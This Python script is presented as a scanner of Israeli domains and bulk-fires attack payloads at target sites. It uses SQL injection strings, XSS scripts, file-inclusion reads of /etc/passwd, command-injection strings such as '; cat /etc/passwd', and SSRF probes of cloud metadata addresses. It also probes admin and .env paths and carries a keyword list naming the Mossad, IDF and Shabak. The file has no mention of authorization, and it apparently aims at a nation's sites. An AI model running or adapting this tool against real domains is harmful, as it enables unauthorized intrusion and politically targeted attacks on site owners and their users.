#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Israeli Domain Vulnerability Scanner
ماسح ثغرات الدومينات الإسرائيلية
Created by SayerLinux (SayerLinux1@gmail.com)
"""

import requests
import urllib3
import json
import re
import time
import concurrent.futures
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime
import random
import string
import base64
import socket
import ssl
from bs4 import BeautifulSoup

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class IsraeliVulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Vulnerability payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "1' OR '1'='1",
            "1' OR 1 -- -",
            "1' OR 1=1--",
            "1' UNION SELECT 1,2,3--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'>\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>"
        ]
        
        self.lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252fetc%252fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd"
        ]
        
        self.command_injection_payloads = [
            "; id",
            "| id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "&& whoami",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; ping -c 1 127.0.0.1",
            "| ping -c 1 127.0.0.1"
        ]
        
        self.ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://169.254.169.254",  # AWS metadata
            "http://metadata.google.internal",  # GCP metadata
            "file:///etc/passwd",
            "dict://127.0.0.1:11211",  # Memcached
            "gopher://127.0.0.1:25",  # SMTP
            "ftp://127.0.0.1:21"
        ]
        
        self.common_paths = [
            '/admin', '/admin.php', '/administrator', '/wp-admin',
            '/login', '/login.php', '/signin', '/auth',
            '/config', '/configuration.php', '/settings',
            '/backup', '/backups', '/db', '/database',
            '/test', '/dev', '/development', '/staging',
            '/api', '/api/v1', '/rest', '/graphql',
            '/uploads', '/files', '/documents', '/media',
            '/.git', '/.env', '/.htaccess', '/robots.txt',
            '/phpinfo.php', '/info.php', '/phpmyadmin',
            '/cgi-bin', '/tmp', '/temp', '/cache'
        ]
        
        self.israeli_keywords = [
            'israel', 'jerusalem', 'telaviv', 'haifa', 'beer', 'netanya',
            'holon', 'rishon', 'petah', 'ashdod', 'batyam', 'herzliya',
            'mossad', 'idf', 'shabak', 'military', 'defense', 'security'
        ]
        
    def get_forms(self, url):
        """Extract all forms from a webpage"""
        try:
            response = self.session.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.find_all('form')
        except:
            return []
            
    def get_form_details(self, form):
        """Extract form details"""
        details = {}
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        
        inputs = []
        for input_tag in form.find_all('input'):
            input_type = input_tag.get('type', 'text')
            input_name = input_tag.get('name')
            input_value = input_tag.get('value', '')
            if input_name:
                inputs.append({
                    'type': input_type,
                    'name': input_name,
                    'value': input_value
                })
                
        details['action'] = action
        details['method'] = method
        details['inputs'] = inputs
        return details
        
    def test_sql_injection(self, url, form_details=None):
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        if form_details:
            # Form-based SQL injection testing
            for payload in self.sql_payloads:
                form_data = {}
                for input_field in form_details['inputs']:
                    if input_field['type'] in ['text', 'password', 'search']:
                        form_data[input_field['name']] = payload
                    else:
                        form_data[input_field['name']] = input_field['value']
                        
                try:
                    if form_details['method'] == 'post':
                        response = self.session.post(urljoin(url, form_details['action']), 
                                                     data=form_data, timeout=10, verify=False)
                    else:
                        response = self.session.get(urljoin(url, form_details['action']), 
                                                   params=form_data, timeout=10, verify=False)
                    
                    # Check for SQL injection indicators
                    sql_errors = [
                        'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
                        'PostgreSQL query failed', 'Warning: pg_',
                        'ORA-', 'Oracle error', 'Oracle driver',
                        'SQLite error', 'sqlite_',
                        'SQLServer JDBC Driver', 'SqlException',
                        'DB2 SQL error', 'Sybase message',
                        'You have an error in your SQL syntax'
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            vulnerabilities.append({
                                'type': 'SQL Injection',
                                'severity': 'High',
                                'url': url,
                                'parameter': list(form_data.keys()),
                                'payload': payload,
                                'description': f'SQL error detected: {error}',
                                'proof': response.text[:200]
                            })
                            break
                            
                except Exception as e:
                    continue
                    
        # URL parameter SQL injection testing
        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            
            for param_name in params:
                for payload in self.sql_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                    
                    try:
                        response = self.session.get(test_url, timeout=10, verify=False)
                        
                        # Check for SQL errors
                        sql_errors = [
                            'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
                            'PostgreSQL query failed', 'Warning: pg_',
                            'ORA-', 'Oracle error', 'Oracle driver',
                            'SQLite error', 'sqlite_',
                            'SQLServer JDBC Driver', 'SqlException',
                            'DB2 SQL error', 'Sybase message',
                            'You have an error in your SQL syntax'
                        ]
                        
                        for error in sql_errors:
                            if error.lower() in response.text.lower():
                                vulnerabilities.append({
                                    'type': 'SQL Injection',
                                    'severity': 'High',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'description': f'SQL error detected: {error}',
                                    'proof': response.text[:200]
                                })
                                break
                                
                    except:
                        continue
                        
        return vulnerabilities
        
    def test_xss(self, url, form_details=None):
        """Test for Cross-Site Scripting (XSS) vulnerabilities"""
        vulnerabilities = []
        
        if form_details:
            # Form-based XSS testing
            for payload in self.xss_payloads:
                form_data = {}
                for input_field in form_details['inputs']:
                    if input_field['type'] in ['text', 'search', 'textarea']:
                        form_data[input_field['name']] = payload
                    else:
                        form_data[input_field['name']] = input_field['value']
                        
                try:
                    if form_details['method'] == 'post':
                        response = self.session.post(urljoin(url, form_details['action']), 
                                                     data=form_data, timeout=10, verify=False)
                    else:
                        response = self.session.get(urljoin(url, form_details['action']), 
                                                   params=form_data, timeout=10, verify=False)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        vulnerabilities.append({
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'Medium',
                            'url': url,
                            'parameter': list(form_data.keys()),
                            'payload': payload,
                            'description': 'XSS payload reflected in response',
                            'proof': response.text[:500]
                        })
                        
                except:
                    continue
                    
        # URL parameter XSS testing
        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            
            for param_name in params:
                for payload in self.xss_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                    
                    try:
                        response = self.session.get(test_url, timeout=10, verify=False)
                        
                        if payload in response.text:
                            vulnerabilities.append({
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'Medium',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'description': 'XSS payload reflected in response',
                                'proof': response.text[:500]
                            })
                            
                    except:
                        continue
                        
        return vulnerabilities
        
    def test_lfi(self, url):
        """Test for Local File Inclusion (LFI) vulnerabilities"""
        vulnerabilities = []
        
        # Test URL parameters
        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            
            for param_name in params:
                for payload in self.lfi_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                    
                    try:
                        response = self.session.get(test_url, timeout=10, verify=False)
                        
                        # Check for file content indicators
                        file_indicators = [
                            'root:', 'daemon:', 'bin:', 'sys:', 'sync:',
                            'Windows IP Configuration', 'Host Name',
                            'boot loader', 'kernel',
                            'mysql', 'database', 'username', 'password'
                        ]
                        
                        for indicator in file_indicators:
                            if indicator in response.text:
                                vulnerabilities.append({
                                    'type': 'Local File Inclusion (LFI)',
                                    'severity': 'High',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'description': f'File content detected: {indicator}',
                                    'proof': response.text[:300]
                                })
                                break
                                
                    except:
                        continue
                        
        return vulnerabilities
        
    def test_command_injection(self, url):
        """Test for Command Injection vulnerabilities"""
        vulnerabilities = []
        
        # Test URL parameters
        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            
            for param_name in params:
                for payload in self.command_injection_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                    
                    try:
                        response = self.session.get(test_url, timeout=10, verify=False)
                        
                        # Check for command output indicators
                        cmd_indicators = [
                            'uid=', 'gid=', 'groups=', 'user=',
                            'root', 'daemon', 'bin', 'sys',
                            'Windows IP Configuration', 'Host Name',
                            'PING', '64 bytes from', 'icmp_seq='
                        ]
                        
                        for indicator in cmd_indicators:
                            if indicator in response.text:
                                vulnerabilities.append({
                                    'type': 'Command Injection',
                                    'severity': 'Critical',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'description': f'Command output detected: {indicator}',
                                    'proof': response.text[:300]
                                })
                                break
                                
                    except:
                        continue
                        
        return vulnerabilities
        
    def test_ssrf(self, url):
        """Test for Server-Side Request Forgery (SSRF) vulnerabilities"""
        vulnerabilities = []
        
        # Test URL parameters
        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            
            for param_name in params:
                for payload in self.ssrf_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                    
                    try:
                        response = self.session.get(test_url, timeout=10, verify=False)
                        
                        # Check for SSRF indicators
                        ssrf_indicators = [
                            'AWS', 'amazonaws', 'ec2', 's3',
                            'metadata', 'instance-id', 'ami-id',
                            'google', 'compute', 'project',
                            'localhost', '127.0.0.1', '0.0.0.0'
                        ]
                        
                        for indicator in ssrf_indicators:
                            if indicator in response.text.lower():
                                vulnerabilities.append({
                                    'type': 'Server-Side Request Forgery (SSRF)',
                                    'severity': 'High',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'description': f'SSRF response detected: {indicator}',
                                    'proof': response.text[:300]
                                })
                                break
                                
                    except:
                        continue
                        
        return vulnerabilities
        
    def test_directory_traversal(self, url):
        """Test for Directory Traversal vulnerabilities"""
        vulnerabilities = []
        
        # Test common paths
        for path in self.common_paths:
            test_url = urljoin(url, path)
            
            try:
                response = self.session.get(test_url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # Check for sensitive content
                    sensitive_indicators = [
                        'admin', 'password', 'username', 'database',
                        'config', 'settings', 'backup', 'private',
                        'secret', 'key', 'token', 'api'
                    ]
                    
                    content_lower = response.text.lower()
                    for indicator in sensitive_indicators:
                        if indicator in content_lower:
                            vulnerabilities.append({
                                'type': 'Information Disclosure',
                                'severity': 'Medium',
                                'url': test_url,
                                'parameter': 'path',
                                'payload': path,
                                'description': f'Sensitive content detected: {indicator}',
                                'proof': response.text[:200]
                            })
                            break
                            
            except:
                continue
                
        return vulnerabilities
        
    def test_ssl_tls(self, url):
        """Test SSL/TLS configuration"""
        vulnerabilities = []
        
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        port = parsed_url.port or 443
        
        try:
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    not_after = cert['notAfter']
                    cert_expiry = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                    
                    if cert_expiry < datetime.now():
                        vulnerabilities.append({
                            'type': 'Expired SSL Certificate',
                            'severity': 'High',
                            'url': url,
                            'parameter': 'SSL',
                            'payload': '',
                            'description': f'SSL certificate expired on {cert_expiry}',
                            'proof': f'Certificate expires: {not_after}'
                        })
                        
                    # Check for weak protocols
                    protocol = ssock.version()
                    if protocol in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        vulnerabilities.append({
                            'type': 'Weak SSL/TLS Protocol',
                            'severity': 'Medium',
                            'url': url,
                            'parameter': 'SSL',
                            'payload': '',
                            'description': f'Weak protocol detected: {protocol}',
                            'proof': f'Protocol: {protocol}'
                        })
                        
        except Exception as e:
            vulnerabilities.append({
                'type': 'SSL/TLS Error',
                'severity': 'Medium',
                'url': url,
                'parameter': 'SSL',
                'payload': '',
                'description': f'SSL/TLS connection error: {str(e)}',
                'proof': str(e)
            })
            
        return vulnerabilities
        
    def scan_domain(self, domain, scan_intensity='medium'):
        """Main scanning function for a domain"""
        print(f"[*] Starting vulnerability scan for: {domain}")
        
        all_vulnerabilities = []
        
        # Ensure URL has proper scheme
        if not domain.startswith(('http://', 'https://')):
            urls_to_test = [f"http://{domain}", f"https://{domain}"]
        else:
            urls_to_test = [domain]
            
        for base_url in urls_to_test:
            try:
                print(f"[*] Testing URL: {base_url}")
                
                # Get forms from the page
                forms = self.get_forms(base_url)
                print(f"[+] Found {len(forms)} forms on {base_url}")
                
                # Test each form
                for form in forms:
                    form_details = self.get_form_details(form)
                    
                    # SQL Injection testing
                    print("[*] Testing for SQL Injection...")
                    sql_vulns = self.test_sql_injection(base_url, form_details)
                    all_vulnerabilities.extend(sql_vulns)
                    
                    # XSS testing
                    print("[*] Testing for XSS...")
                    xss_vulns = self.test_xss(base_url, form_details)
                    all_vulnerabilities.extend(xss_vulns)
                    
                # Test URL parameters
                print("[*] Testing URL parameters...")
                
                # LFI testing
                lfi_vulns = self.test_lfi(base_url)
                all_vulnerabilities.extend(lfi_vulns)
                
                # Command Injection testing
                cmd_vulns = self.test_command_injection(base_url)
                all_vulnerabilities.extend(cmd_vulns)
                
                # SSRF testing
                ssrf_vulns = self.test_ssrf(base_url)
                all_vulnerabilities.extend(ssrf_vulns)
                
                # Directory traversal testing
                dir_vulns = self.test_directory_traversal(base_url)
                all_vulnerabilities.extend(dir_vulns)
                
                # SSL/TLS testing (for HTTPS)
                if base_url.startswith('https://'):
                    ssl_vulns = self.test_ssl_tls(base_url)
                    all_vulnerabilities.extend(ssl_vulns)
                    
            except Exception as e:
                print(f"[-] Error scanning {base_url}: {e}")
                continue
                
        # Remove duplicates
        unique_vulnerabilities = []
        seen = set()
        
        for vuln in all_vulnerabilities:
            vuln_key = f"{vuln['type']}:{vuln['url']}:{vuln.get('parameter', '')}"
            if vuln_key not in seen:
                seen.add(vuln_key)
                unique_vulnerabilities.append(vuln)
                
        print(f"[+] Scan completed. Found {len(unique_vulnerabilities)} unique vulnerabilities")
        
        return {
            'domain': domain,
            'scan_time': datetime.now().isoformat(),
            'total_vulnerabilities': len(unique_vulnerabilities),
            'vulnerabilities': unique_vulnerabilities
        }
        
    def scan_multiple_domains(self, domains, max_workers=5):
        """Scan multiple domains concurrently"""
        print(f"[*] Starting vulnerability scan for {len(domains)} domains")
        
        results = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_domain = {
                executor.submit(self.scan_domain, domain): domain 
                for domain in domains
            }
            
            for future in concurrent.futures.as_completed(future_to_domain):
                domain = future_to_domain[future]
                try:
                    result = future.result()
                    results.append(result)
                    print(f"[+] Completed scan for {domain}")
                except Exception as e:
                    print(f"[-] Error scanning {domain}: {e}")
                    results.append({
                        'domain': domain,
                        'scan_time': datetime.now().isoformat(),
                        'total_vulnerabilities': 0,
                        'vulnerabilities': [],
                        'error': str(e)
                    })
                    
        return results
        
    def save_results(self, results, filename):
        """Save scan results to file"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            print(f"[+] Results saved to {filename}")
            return True
        except Exception as e:
            print(f"[-] Error saving results: {e}")
            return False

if __name__ == "__main__":
    scanner = IsraeliVulnerabilityScanner()
    
    # Test with a sample domain
    test_domains = ["example.co.il", "test.org.il"]
    
    print("[*] Starting Israeli domain vulnerability scan...")
    results = scanner.scan_multiple_domains(test_domains)
    
    # Save results
    filename = f"vulnerability_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    scanner.save_results(results, filename)
    
    print(f"\n[+] Vulnerability scan completed!")
    print(f"[+] Total domains scanned: {len(results)}")
    total_vulns = sum(r['total_vulnerabilities'] for r in results)
    print(f"[+] Total vulnerabilities found: {total_vulns}")
    print(f"[+] Results saved to: {filename}")